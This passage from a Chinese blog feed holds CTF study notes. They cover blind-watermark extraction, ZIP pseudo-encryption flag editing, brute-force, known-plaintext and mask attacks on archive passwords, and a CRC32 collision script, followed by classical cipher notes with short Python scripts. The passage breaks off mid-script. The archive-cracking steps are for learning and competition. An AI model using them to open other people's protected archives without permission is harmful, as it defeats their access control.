“待提取的图片路径”</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e9c58820773.jpg"></p><h5 id="终于完成了-我的天"><a href="#终于完成了-我的天" class="headerlink" title="终于完成了 我的天"></a>终于完成了 我的天</h5><h5 id="解密结果会在当前文件夹的-output-txt-中"><a href="#解密结果会在当前文件夹的-output-txt-中" class="headerlink" title="解密结果会在当前文件夹的 output.txt 中"></a>解密结果会在当前文件夹的 output.txt 中</h5><p>结束 F5 </p></li></ol></li><li><h3 id="🎈盲水印隐写"><a href="#🎈盲水印隐写" class="headerlink" title="🎈盲水印隐写"></a>🎈盲水印隐写</h3><ul><li><h4 id="简介-3"><a href="#简介-3" class="headerlink" title="简介"></a>简介</h4><blockquote><p>隐藏式的水印是以数字数据的方式加入音频、图片或影片中,但在一般的状况下无法被看见。</p><p>当有两张图片一模一样时，多半是盲水印加密过的</p></blockquote><p>这里我们用到 <strong>blind-watermark</strong>工具解密</p></li><li><h4 id="安装cv2库"><a href="#安装cv2库" class="headerlink" title="安装cv2库"></a>安装cv2库</h4><p>**这个工具需要安装 cv2 的库 **</p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e9ce7115fa2.jpg"></p><p>​    使用命令安装<code>pip install opencv-python</code></p><p><strong>在安装这个库的时候试错了无数次，一直显示没有模板cv2，在网上也查找了许多资料，但都无法解决，无奈之下只能在windows环境下部署</strong></p><p><a href="https://github.com/chishaxie/BlindWaterMark">https://github.com/chishaxie/BlindWaterMark</a> 安装盲水印工具，</p><p>并放入python <strong>site-packages</strong>文件下</p><ul><li><h4 id="使用方法-2"><a href="#使用方法-2" class="headerlink" title="使用方法"></a>使用方法</h4><p>这一部分<strong>也试错了许多，</strong>因为我是在python3环境下解密的，所以在使用常用的命令解密时，会出现下图的情况</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60ebc8413d38b.jpg"></p><p>查找大量资料才知道，<strong>主要原因是python2和python3 random的算法不同，如果要让python3兼容python2的random算法请加 <code>--oldseed</code>参数。</strong></p><p>以下为<strong>python3</strong>解密：</p><p>首先cd到盲水印工具安装目录下，然后输入</p><p><code>python bwmforpy3.py decode 0.png 1.png flag.png --oldseed</code></p><p>0.png 和 1.png为两张相同的图片</p><p>flag.png为解密后的结果</p></li></ul><p>​        运行脚本后提取查看解密结果</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60ebca13c78c7.jpg"></p></li></ul><h2 id="😺压缩包破解"><a href="#😺压缩包破解" class="headerlink" title="😺压缩包破解"></a>😺压缩包破解</h2><ul><li><h3 id="🎈伪加密"><a href="#🎈伪加密" class="headerlink" title="🎈伪加密"></a>🎈伪加密</h3><ul><li><h4 id="简介-4"><a href="#简介-4" class="headerlink" title="简介"></a>简介</h4></li></ul></li></ul><blockquote><p>zip伪加密是在<strong>文件头的加密标志位做修改</strong>，进而再打开文件时识被别为加密压缩包。</p><p><strong>一个 ZIP 文件由三个部分组成：</strong></p><p>压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志</p></blockquote><p>而伪加密就是在<strong>压缩源文件目录区</strong>中进行修改数据达到伪加密的效果。</p><p>把 <em><strong>压缩源文件目录区</strong></em> 的 <strong>全局方式位标记</strong>  的 01 00 或 09 00 改为 00 00  就可以<strong>去除</strong>密码</p><p>把 <em><strong>压缩源文件目录区</strong></em> 的 <strong>全局方式位标记</strong>  的 00 00 改为  01 00 或 09 00  就可以<em><strong>添加</strong></em>密码 </p><p>经验告诉我一般是在<strong>倒数第二个</strong>的文件头中更改。找到文件头第九第十个字符，将其修改为0000<strong>即可解密</strong></p><h5 id="🤦‍♂️举个栗子吧"><a href="#🤦‍♂️举个栗子吧" class="headerlink" title="🤦‍♂️举个栗子吧"></a>🤦‍♂️举个栗子吧</h5><p>我们用010打开压缩包</p><p>然后用ctrl+f进行寻找文件头为 504B0102的</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60ebd0be4227c.jpg"></p><p>然后我们将第九个字符改为09</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60ebd073f1a4d.jpg"></p><p>如下图可发现 压缩包已经上锁了</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60ebd1a199874.jpg"></p><p>如果要打开，也是同样的道理，将09改为00即可</p><ul><li><h3 id="🎈字典爆破（暴力）"><a href="#🎈字典爆破（暴力）" class="headerlink" title="🎈字典爆破（暴力）"></a>🎈字典爆破（暴力）</h3><blockquote><p>暴力破解就是选择密码范围,长度等,由软件组合生成密码进行爆破</p></blockquote></li></ul><p>这里我们用到windows下的软件 advanced zip password recovery</p><p>我们将软件打开后，选择统计类型为<strong>暴力</strong></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60ed5577adb81.jpg"></p><p>设置完毕后点击开始，即开始爆破</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60ed559ea345c.jpg"></p><p>如图，暴力破解已找到答案</p><ul><li><h3 id="🎈明文攻击"><a href="#🎈明文攻击" class="headerlink" title="🎈明文攻击"></a>🎈明文攻击</h3><p>明文攻击真的学到了超级多知识</p><ul><li><h4 id="简介-5"><a href="#简介-5" class="headerlink" title="简介"></a>简介</h4><blockquote><p>所谓明文攻击就是已经通过其他手段知道zip加密文件中的某些内容，比如在某些网站上发现它的readme.txt文件，或者其他文件，这时就可以尝试破解了</p></blockquote></li><li><h4 id="前提！！"><a href="#前提！！" class="headerlink" title="前提！！"></a>前提！！</h4><p><strong>明文文件要和加密文件的格式相同，所以这里需要压缩–这里一定要注意我们的压缩方式要相同</strong></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60ed3e3920ff9.jpg"></p></li></ul></li></ul><h4 id="👱‍♂️举个例子"><a href="#👱‍♂️举个例子" class="headerlink" title="👱‍♂️举个例子"></a>👱‍♂️举个例子</h4><p>​        如图 下面是一个压缩包 但是我们可以发现，里面还有一个11.zip，并且内容也是加密的，但是我们已知一张图片，可以看到这张图片的<strong>CRC值和压缩包里面的图片CRC值一样</strong></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60ed02234d6dc.jpg"></p><p>​        接下来我们放入 ARCHPR 中进行明文攻击，如下图，注意几个框框</p><p>​        <img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60ed3f3f5b092.jpg"></p><p>注意：虽然显示一直在爆破，但我们只要<strong>中断爆破</strong>，然后就会弹出一个压缩包，这时已经解密成功了。</p><table><tr><td><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60ed4058ccd2d.jpg"></td><td><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60ed40699ce45.jpg"></td></tr></table><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60ed40979661f.jpg"></p><ul><li><h3 id="🎈掩码攻击"><a href="#🎈掩码攻击" class="headerlink" title="🎈掩码攻击"></a>🎈掩码攻击</h3><p>我的理解：  当我们记得密码的部分，或者几个字符或者长度时，这时我们可以用掩码攻击来爆破，穷举。</p><p>这里我们还是用到  ARCHPR  软件</p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60ed4a51ed8c5.jpg"></p><p>​    如图 从注释中我们得知 password 为：jhc????!@#$</p><p>​    <strong>很显然掩码攻击，如下图，注意框框中的信息。</strong></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60ed4af5a36e1.jpg"></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60ed4b620eddc.jpg"></p><p>​        解密结果已经出来</p><ul><li><h3 id="🎈CRC32碰撞"><a href="#🎈CRC32碰撞" class="headerlink" title="🎈CRC32碰撞"></a>🎈CRC32碰撞</h3><ul><li><h5 id="4位字节CRC32碰撞"><a href="#4位字节CRC32碰撞" class="headerlink" title="4位字节CRC32碰撞"></a>4位字节CRC32碰撞</h5><p>简单地说就是在一个压缩包中，有<strong>两个加密文件字节</strong>是一样的，而文件的内容只有相同的时候，他的crc校验才会一样，这时我们可以通过获取他的crc32值来与我们的内容<strong>计算得到的值</strong>进行相互比较。</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60ed4e1bd25fe.jpg"></p></li></ul><p>​        上脚本！！ 此脚本具有<strong>多线程</strong></p><p>​        </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crc</span>(<span class="params">_crc</span>):</span></span><br><span class="line">    l = <span class="number">1</span></span><br><span class="line">    dic = string.printable</span><br><span class="line">    _<span class="built_in">input</span> = _crc</span><br><span class="line">    _<span class="built_in">input</span> = <span class="string">&quot;0X&quot;</span> + _<span class="built_in">input</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">for</span> h <span class="keyword">in</span> dic:</span><br><span class="line">                <span class="keyword">for</span> m <span class="keyword">in</span> dic:</span><br><span class="line">                    s = i + n + h + m</span><br><span class="line">                    s = s.encode()</span><br><span class="line">                    <span class="comment"># print(str(binascii.crc32(s)), _input)</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">hex</span>(binascii.crc32(s)).upper() == _<span class="built_in">input</span>.upper():</span><br><span class="line">                        <span class="built_in">print</span>(_crc, <span class="string">&#x27;:&#x27;</span>, s.decode())</span><br><span class="line">                        <span class="built_in">print</span>(l)</span><br><span class="line">                        sys.exit()  <span class="comment">#直接退出，不进行接下来的碰撞了，一般在做题的时候，碰撞不会重复</span></span><br><span class="line">                    l = l + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crc32</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;四字节碰撞!!!&quot;</span>)</span><br><span class="line">    num = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;你可能需要多个线程同时进行碰撞，请输入线程数：&quot;</span>))</span><br><span class="line">    _thread = []</span><br><span class="line">    _args = []</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;输入参数&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">        <span class="built_in">print</span>(i+<span class="number">1</span>, end=<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">        _args.append(<span class="built_in">input</span>())</span><br><span class="line">    <span class="comment"># print(_args)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">        t = threading.Thread(target=crc, args=(_args[i],))</span><br><span class="line">        _thread.append(t) <span class="comment">#如果在这里开始线程会出一点小bug，虽然不要紧，但是不好看，不信的话你们自己试试</span></span><br><span class="line">    <span class="comment"># print(_thread)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">        _thread[i].start()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">        _thread[i].join()</span><br><span class="line">    <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    crc32()</span><br></pre></td></tr></table></figure><p>结果如下，Asr3 和 Tp01 则分别是两个txt文件的内容，拼起来即是压缩包密码</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60ed5149c3eef.jpg"></p><ul><li><h5 id="6位字节CRC32碰撞"><a href="#6位字节CRC32碰撞" class="headerlink" title="6位字节CRC32碰撞"></a>6位字节CRC32碰撞</h5></li></ul><p>相比于4字节，6字节会更难爆破一些，我在github上找了个工具</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60ed52a367df5.jpg"></p><p>在windows命令行中进入crc32文件夹中</p><p><strong>输入命令 <code>python crc32.py reverse 0x（为文件CRC32值）</code></strong></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60ed53252397f.jpg"></p><p>如图我们已经将txt密码穷举出来了，这代表碰撞成功，接下来就是进行密码穷举，然后爆破，这里不多赘述了</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 align = &quot;center&quot;&gt;Misc学习笔记&lt;/h1&gt;

&lt;h2 id=&quot;😺图片隐写&quot;&gt;&lt;a href=&quot;#😺图片隐写&quot; class=&quot;headerlink&quot; title=&quot;😺图片隐写&quot;&gt;&lt;/a&gt;😺图片隐写&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;h3 id=&quot;🎈Ex</summary>
      
    
    
    
    <category term="-CTF" scheme="https://abinix.top/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>密码学学习笔记</title>
    <link href="https://abinix.top/2021/07/09/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://abinix.top/2021/07/09/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2021-07-09T08:46:33.000Z</published>
    <updated>2021-08-12T16:29:03.657Z</updated>
    
    <content type="html"><![CDATA[<h1 align = "center">密码学学习笔记</h1><h2 id="🐕凯撒密码"><a href="#🐕凯撒密码" class="headerlink" title="🐕凯撒密码"></a>🐕凯撒密码</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>凯撒密码是最早的代换密码，使用单表代换。其基本思想是：通过把字母移动一定的位数来实现加密和解密。明文中的所有字母都在字母表上向后(或向前)按照一个固定数目进行偏移后被替换成密文。例如，<strong>当偏移量是3的时候，所有的字母A将被替换成D，B变成E，以此类推X将变成A，Y变成B，Z变成C。</strong> <strong>位数</strong>就是凯撒密码加密和解密的密钥。<br><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210720214247.png"></p><p>举个栗子：如果要对“zhaobin”这几个字符加密 设偏移量为 3，则我们对应ascii码进行位移</p><ul><li><p>z-&gt;w</p></li><li><p>h-&gt;e</p></li><li><p>a-&gt;x</p></li><li><p>o-&gt;l</p></li><li><p>b-&gt;y</p></li><li><p>i-&gt;f</p></li><li><p>n-&gt;k</p><p>这样就将“zhaobin”加密为了“wexlyfk”，这就是凯撒</p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210720214423.png"></p><h3 id="对于凯撒的解密，我们可以用脚本也可以用工具，python脚本如下（纯字母）"><a href="#对于凯撒的解密，我们可以用脚本也可以用工具，python脚本如下（纯字母）" class="headerlink" title="对于凯撒的解密，我们可以用脚本也可以用工具，python脚本如下（纯字母）"></a>对于凯撒的解密，我们可以用脚本也可以用工具，python脚本如下（纯字母）</h3><p>此题偏移量为3，所以代码中my为3</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;wexlyfk&#x27;</span></span><br><span class="line">my = <span class="number">3</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>,<span class="string">&quot;密钥&quot;</span>,my)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;密文:&quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">  mw = <span class="built_in">ord</span>(i)</span><br><span class="line">  <span class="keyword">if</span> (<span class="number">64</span> &lt; mw &lt; <span class="number">91</span>):<span class="comment">#大写字母</span></span><br><span class="line">    jm = mw + my</span><br><span class="line">    <span class="keyword">if</span> jm &gt; <span class="number">90</span>:</span><br><span class="line">      jm = (mw - <span class="number">26</span>) + my</span><br><span class="line">      <span class="built_in">print</span>(<span class="built_in">chr</span>(jm), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      <span class="built_in">print</span>(<span class="built_in">chr</span>(jm), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">  <span class="keyword">elif</span> (<span class="number">96</span> &lt; mw &lt; <span class="number">123</span>):<span class="comment">#小写字母</span></span><br><span class="line">    jm = mw + my</span><br><span class="line">    <span class="keyword">if</span> jm &gt; <span class="number">122</span>:</span><br><span class="line">      jm = (mw - <span class="number">26</span>) + my</span><br><span class="line">      <span class="built_in">print</span>(<span class="built_in">chr</span>(jm), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      <span class="built_in">print</span>(<span class="built_in">chr</span>(jm), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    jm = mw + <span class="number">0</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(jm), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果</p><h2 id="🐕变异凯撒"><a href="#🐕变异凯撒" class="headerlink" title="🐕变异凯撒"></a>🐕变异凯撒</h2><h3 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h3><p>变异凯撒就是在凯撒的基础上<strong>有规律</strong>的位移</p><p>再次举个栗子</p><p>选用buu上的一道题</p><p><strong>密文</strong>：afZ_r9VYfScOeO_UL^RWUc  因为是ctf题 所以我们看看能否与ctf 或者flag 对应上</p><ul><li><p>a的ascii码是<em>97</em>   而f的ascii是<em>102</em></p></li><li><p>f的ascii码是<em>102</em>  而l的ascii是<em>108</em></p></li><li><p>Z的ascii码是<em>106</em>  而a的ascii是<em>97</em></p></li><li><p>_的ascii码是<em>95</em>  而g的ascii是<em>103</em></p></li></ul><p>a→f： 移动了5  f→l：移动了6， 后面依次移动了7、8</p><h3 id="既可手撸又可脚本跑-以下为此题的变异凯撒脚本"><a href="#既可手撸又可脚本跑-以下为此题的变异凯撒脚本" class="headerlink" title="既可手撸又可脚本跑  以下为此题的变异凯撒脚本"></a>既可手撸又可脚本跑  以下为此题的变异凯撒脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">KaiSa</span>(<span class="params">string,begin_num</span>):</span></span><br><span class="line">    begin_num = <span class="built_in">int</span>(begin_num)</span><br><span class="line">    string_list = <span class="built_in">list</span>(string)</span><br><span class="line">    print_string=<span class="string">&quot;&quot;</span> </span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> string_list:</span><br><span class="line">        num = <span class="built_in">ord</span>(char)</span><br><span class="line">        num+=begin_num</span><br><span class="line">        begin_num+=<span class="number">1</span></span><br><span class="line">        char=<span class="built_in">chr</span>(num)</span><br><span class="line">        print_string+=char</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(print_string)</span><br><span class="line">KaiSa(<span class="string">&quot;afZ_r9VYfScOeO_UL^RWUc&quot;</span>,<span class="number">5</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>此脚本<strong>固定</strong>起始值 偏移值为5 然后每次循环依次增加</p><p>跑出来结果为  flag{Caesar_variation}  <strong>这就是变异凯撒</strong></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210720214529.png"></p><h2 id="🐕维吉尼亚"><a href="#🐕维吉尼亚" class="headerlink" title="🐕维吉尼亚"></a>🐕维吉尼亚</h2><p>类似的位移密码还有维吉尼亚密码等</p><h3 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h3><p><strong>维吉尼亚密码</strong>（又译<strong>维热纳尔密码</strong>）是使用一系列<a href="https://baike.baidu.com/item/%E5%87%AF%E6%92%92%E5%AF%86%E7%A0%81">凯撒密码</a>组成密码字母表的<a href="https://baike.baidu.com/item/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/2816213">加密算法</a>，属于多表密码的一种简单形式。</p><p>它将凯撒密码的全部25种位移排序为一张表，与原字母序列共同组成26行及26列的字母表。另外，维吉尼亚密码必须有一个密钥，这个密钥由字母组成，最少一个，最多可与明文字母数量相等。</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210720214544.png"></p><h4 id="解密方法："><a href="#解密方法：" class="headerlink" title="解密方法："></a>解密方法：</h4><p>​    <a href="https://www.qqxiuzi.cn/bianma/weijiniyamima.php">https://www.qqxiuzi.cn/bianma/weijiniyamima.php</a> 用在线解密即可</p><p>例：</p><p>明文：i love it</p><p>密钥：zb</p><p>密文：j kpuf hu</p><h2 id="🐕Base家族"><a href="#🐕Base家族" class="headerlink" title="🐕Base家族"></a>🐕Base家族</h2><p>base解法用在线工具即可</p><p><a href="http://www.atoolbox.net/Category.php?Id=27">http://www.atoolbox.net/Category.php?Id=27</a></p><h3 id="🐱‍🐉Base62"><a href="#🐱‍🐉Base62" class="headerlink" title="🐱‍🐉Base62"></a>🐱‍🐉Base62</h3><ul><li><h4 id="base62编码原理"><a href="#base62编码原理" class="headerlink" title="base62编码原理"></a>base62编码原理</h4><blockquote><p>Base62编码是由10个数字、26个大写英文字母和26个小写英文字母组成</p></blockquote></li></ul><h3 id="🐱‍🐉Base91"><a href="#🐱‍🐉Base91" class="headerlink" title="🐱‍🐉Base91"></a>🐱‍🐉Base91</h3><ul><li><h4 id="base91编码原理"><a href="#base91编码原理" class="headerlink" title="base91编码原理"></a>base91编码原理</h4><blockquote><p>从94个可打印ASCII字符（0x21-0x7E）中，以下三个字符被省略以构建base91字母：  　　　  -（破折号，0x2D） 　　　</p><p>​            \（反斜杠，0x5C） 　　　</p><p>​            ‘（撇号，0x27）</p></blockquote><h4 id="Base92则是-比base91-多一个字符-〜"><a href="#Base92则是-比base91-多一个字符-〜" class="headerlink" title="Base92则是 比base91 多一个字符 〜"></a>Base92则是 比base91 多一个字符 〜</h4></li></ul><h3 id="🐱‍🐉Base58"><a href="#🐱‍🐉Base58" class="headerlink" title="🐱‍🐉Base58"></a>🐱‍🐉Base58</h3><ul><li><h4 id="base58编码原理"><a href="#base58编码原理" class="headerlink" title="base58编码原理"></a>base58编码原理</h4><blockquote><p>字符为：123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz 去掉：0 O l  58=9个阿拉伯数字（去掉0）+24个大写字母（去掉I和O）+25小写字母（去掉l） </p></blockquote></li></ul><h3 id="🐱‍🐉Base36"><a href="#🐱‍🐉Base36" class="headerlink" title="🐱‍🐉Base36"></a>🐱‍🐉Base36</h3><ul><li><h4 id="base36编码原理"><a href="#base36编码原理" class="headerlink" title="base36编码原理"></a>base36编码原理</h4><blockquote><p>base36编码是使用0~9的数字，加上所有26个字母，所有的<strong>字母要不全大写，要不全小写。</strong></p></blockquote></li></ul><h3 id="🐱‍🐉Base16"><a href="#🐱‍🐉Base16" class="headerlink" title="🐱‍🐉Base16"></a>🐱‍🐉Base16</h3><ul><li><h4 id="base16编码原理"><a href="#base16编码原理" class="headerlink" title="base16编码原理"></a>base16编码原理</h4><blockquote><p>Base16编码使用16个ASCII可打印字符<strong>（数字0-9和字母A-F）</strong>对任意字节数据进行编码。</p></blockquote><p>简单地说：用16（2的4次方）个字符，对二进制数据进行编码的方式</p></li></ul><h3 id="🐱‍🐉Base64（最常见的base编码）"><a href="#🐱‍🐉Base64（最常见的base编码）" class="headerlink" title="🐱‍🐉Base64（最常见的base编码）"></a>🐱‍🐉Base64（最常见的base编码）</h3><ul><li><h4 id="base64编码原理"><a href="#base64编码原理" class="headerlink" title="base64编码原理"></a>base64编码原理</h4><blockquote><p>Base64编码是使用64个可打印ASCII字符<strong>（A-Z、a-z、0-9、+、/）</strong>将任意字节序列数据编码成ASCII字符串，另有“=”符号用作后缀用途。</p></blockquote><p>简单的说 就是 <strong>使用64个可打印字符来表示二进制数据的方法</strong></p><p><strong>base64格式通常以==结尾</strong></p></li><li><h4 id="base64解密"><a href="#base64解密" class="headerlink" title="base64解密"></a>base64解密</h4><p><a href="https://base64.us/">https://base64.us/</a> 官网在线解密或用工具解密</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210720214619.png"></p></li></ul><h3 id="🐱‍🐉Base32"><a href="#🐱‍🐉Base32" class="headerlink" title="🐱‍🐉Base32"></a>🐱‍🐉Base32</h3><ul><li><h4 id="base32编码原理"><a href="#base32编码原理" class="headerlink" title="base32编码原理"></a>base32编码原理</h4><blockquote><p>Base32编码是使用32个可打印字符<strong>（字母A-Z和数字2-7）</strong></p></blockquote><p>简单的说 就是 <strong>用32（2的5次方）个字符，对二进制数据进行编码的方式</strong></p></li></ul><h2 id="🐕栅栏密码"><a href="#🐕栅栏密码" class="headerlink" title="🐕栅栏密码"></a>🐕栅栏密码</h2><h3 id="传统型"><a href="#传统型" class="headerlink" title="传统型"></a>传统型</h3><h3 id="简介-3"><a href="#简介-3" class="headerlink" title="简介"></a>简介</h3><blockquote><p>所谓栅栏密码，就是把明文分成N个组，然后取出每组的第一个，每组的第二个。接着按顺序排列得出密文。若每个组里有2两个元素的话就叫2栏栅栏密码。</p><p>栅栏密码分为传统型和W型</p></blockquote><h4 id="🤦‍♂️再举个栗子吧"><a href="#🤦‍♂️再举个栗子吧" class="headerlink" title="🤦‍♂️再举个栗子吧"></a>🤦‍♂️再举个栗子吧</h4><h5 id="加密篇"><a href="#加密篇" class="headerlink" title="加密篇"></a>加密篇</h5><p>例如明文为：The girl is beautiful 假设我们分为两栏，一共18个字符，2*9=18</p><p>所以我们分为9组  Th eg ir li sb ea ut if ul</p><p>将每组<strong>第一个元素</strong>提取出来 </p><p>第一组 Teilseuiu</p><p>第二组 hgribatfl</p><p>得到密文为 <strong>Teilseuiuhgribatfl</strong></p><h5 id="解密篇"><a href="#解密篇" class="headerlink" title="解密篇"></a>解密篇</h5><p>例如密文为：Teilseuiuhgribatfl 如果我们分两栏，那么</p><p>第一栏为 Teilseuiu</p><p>第二栏为 hgribatfl</p><p>根据栅栏规则，读取<strong>每一组的第一个</strong></p><p>Th eg ir li sb ea ut if ul</p><p>得到明文为 <strong>Thegirlisbeautiful</strong></p><p>通常用工具梭哈，但还是放出python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">string = <span class="built_in">input</span>(<span class="string">&quot;输入:&quot;</span>)</span><br><span class="line">frequency = [] <span class="comment"># 获得栅栏的栏数</span></span><br><span class="line">result_len = <span class="built_in">len</span>(string)        <span class="comment"># 栅栏密码的总长度  25</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, result_len):   <span class="comment"># 最小栅栏长度为2   逐个测试2,3,4....</span></span><br><span class="line">    <span class="keyword">if</span>(result_len % i == <span class="number">0</span>):        <span class="comment"># 当栅栏密码的总长度 模 i 余数为0  则这个i就是栅栏密码的长度</span></span><br><span class="line">        frequency.append(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> numberOfColumn <span class="keyword">in</span> frequency:   <span class="comment"># 循环可能分的栏数</span></span><br><span class="line">    RESULT = []                 <span class="comment">#  保存各栏数的结果</span></span><br><span class="line">    <span class="keyword">for</span> i <span 